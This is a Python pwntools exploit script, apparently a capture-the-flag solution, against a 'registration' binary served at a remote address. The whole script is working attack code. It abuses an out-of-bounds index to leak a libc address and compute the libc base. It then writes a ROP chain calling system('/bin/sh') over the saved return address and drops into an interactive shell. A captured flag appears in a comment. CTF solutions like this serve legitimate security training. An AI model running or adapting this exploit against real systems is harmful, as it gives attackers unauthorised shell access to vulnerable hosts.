#!/usr/bin/env python3

from pwn import *

exe = ELF("./registration_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-v']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("10.0.2.33", 1337)

    return r

def main():
    r = conn()

    # register a new voter at index 20 (beyond the boundary)
    r.sendlineafter(b'> ', b'1\n20\n')

    # read all registers up to that point, which will leak data
    # data contains the return address to `__libc_start_call_main`,
    # which is our `libc` leak 󱅽
    # this start at index 19
    r.sendlineafter(b'> ', b'2')
    r.recvuntil(b"19: ")

    # get base address of libc
    start_call_main_addr = unpack(r.recvuntil(b'\n', drop=True), "all")
    libc.address = start_call_main_addr - (libc.sym["__libc_start_call_main"] + 122)
    # libc.address = start_call_main_addr - (libc.libc_start_main_return)
    r.success(f"leaked {libc.address=:x}")

    # make sure we get a shell
    rop = ROP(libc)
    rop.raw(rop.ret)
    rop.call("system", [next(libc.search(b"/bin/sh\x00"))])
    r.info(f"generated rop chain:\n{rop.dump()}")

    # write each address onto the stack, creating our rop chain
    ropchain_list = [rop.chain()[i:i+8] for i in range(0, len(rop.chain()), 8)]
    for i, addr in enumerate(ropchain_list):
        # return address is at index 19, start overwriting there
        r.sendlineafter(b"> ", bytes(f"1\n{i+19}\n", "latin-1")+addr)

    # exit, run our ropchain
    r.sendlineafter(b"> ", b"3")

    r.interactive()

# flag{rawr_d41d8cd98f00b204e9800998ecf8427e}

if __name__ == "__main__":
    main()
